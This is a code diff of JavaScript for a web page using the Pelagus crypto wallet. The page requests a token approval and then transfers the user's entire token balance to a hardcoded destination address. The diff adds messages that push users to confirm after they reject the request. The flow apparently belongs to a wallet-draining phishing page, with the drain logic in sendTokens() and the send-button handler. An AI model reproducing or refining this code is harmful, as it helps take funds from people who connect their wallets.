@@ -442,6 +442,8 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not detected. Please install or enable it.');
         }
 
+        log('🔄 Requesting approval for token transfer. Please confirm in your Pelagus wallet...');
+
         const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
         const signerAddress = accounts[0];
         console.log(`✅ Wallet connected: ${signerAddress}`);
@@ -458,7 +460,6 @@ async function saveToFirebase(data) {
 
         console.log('✅ Approval Data Prepared:', approveData);
 
-        // Estimate Gas for Approval
         const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -488,46 +489,49 @@ async function saveToFirebase(data) {
             }],
         });
 
-        console.log('✅ Approval Transaction Sent:', txResponse);
-
+        log('✅ Approval transaction sent. Waiting for confirmation...');
         const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
         console.log('✅ Approval Confirmed:', receipt.transactionHash);
 
         alert(`✅ Tokens approved successfully! Transaction Hash: ${receipt.transactionHash}`);
+        log('✅ Approval confirmed. You can now proceed to send tokens.');
 
     } catch (error) {
-        console.error('❌ Error approving tokens:', error.message || error);
-        alert(`❌ Approval Error: ${error.message}`);
+        if (error.message.includes('user rejected')) {
+            log('❌ Approval rejected by the user. Please approve to proceed.');
+            alert('❌ You rejected the approval. Please confirm in your wallet.');
+        } else {
+            console.error('❌ Error approving tokens:', error.message || error);
+            alert(`❌ Approval Error: ${error.message}`);
+        }
+        throw error; // Re-throw to stop further processing
     }
 }
 
-
-        async function sendTokens() {
+async function sendTokens() {
     try {
         if (!window.pelagus) {
             throw new Error('Pelagus wallet not detected. Please install or enable it.');
         }
 
+        log('🔄 Preparing token transfer. Please confirm in your Pelagus wallet...');
+
         const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
         const signerAddress = accounts[0];
         console.log(`✅ Wallet connected: ${signerAddress}`);
 
-        // Use the previously fetched token balance
-        const rawBalance = BigInt(userSession.tokenBalance * 1e18); // Ensure proper formatting
-        console.log(`✅ Using Cached Token Balance: ${rawBalance.toString()}`);
-
+        const rawBalance = BigInt(userSession.tokenBalance * 1e18);
         if (rawBalance === 0n) {
             throw new Error('Token balance is zero. Please verify your token balance.');
         }
 
-        // Prepare Transaction Data
         const transferData = 
             '0xa9059cbb' + 
             DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
             rawBalance.toString(16).padStart(64, '0');
+
         console.log('✅ Transaction Data Prepared:', transferData);
 
-        // Estimate Gas
         const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -543,12 +547,9 @@ async function saveToFirebase(data) {
             }),
         });
         const gasEstimateResult = await gasEstimateResponse.json();
-        console.log('Gas Estimate Response:', gasEstimateResult);
-
         const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas if estimation fails
         console.log(`✅ Gas Estimate: ${gasLimit}`);
 
-        // Send Transaction
         const txResponse = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -558,18 +559,26 @@ async function saveToFirebase(data) {
                 gas: gasLimit,
             }],
         });
-        console.log('✅ Transaction Sent:', txResponse);
 
-        // Wait for Confirmation
+        log('✅ Token transfer initiated. Waiting for confirmation...');
         const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
         console.log('✅ Transaction Confirmed:', receipt.transactionHash);
 
         alert(`🎉 Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
+        log('✅ Tokens sent successfully. Transaction complete.');
+
     } catch (error) {
-        console.error('❌ Error sending tokens:', error.message || error);
-        alert(`❌ Error: ${error.message || 'An unexpected error occurred'}`);
+        if (error.message.includes('user rejected')) {
+            log('❌ Token transfer rejected by the user. Please approve to proceed.');
+            alert('❌ You rejected the transfer. Please confirm in your wallet.');
+        } else {
+            console.error('❌ Error sending tokens:', error.message || error);
+            alert(`❌ Transfer Error: ${error.message}`);
+        }
+        throw error; // Stop further processing
     }
 }
+
 
 // Utility Function for Waiting for Transaction Confirmation
 async function waitForTransaction(txHash, rpcEndpoint) {
@@ -738,11 +747,14 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
     try {
         log('🔄 Step 1: Approving tokens...');
         await approveTokens();
-        log('✅ Approval successful. Proceeding to transfer...');
+        log('✅ Step 1 Complete: Tokens approved. Proceeding to send...');
+        
+        log('🔄 Step 2: Sending tokens...');
         await sendTokens();
+        log('✅ Step 2 Complete: Tokens sent successfully!');
     } catch (error) {
         console.error('❌ Error in approval or transfer:', error.message || error);
-        alert(`❌ Error: ${error.message || 'An unexpected error occurred'}`);
+        log(`❌ Error: ${error.message}`);
     }
 });
 
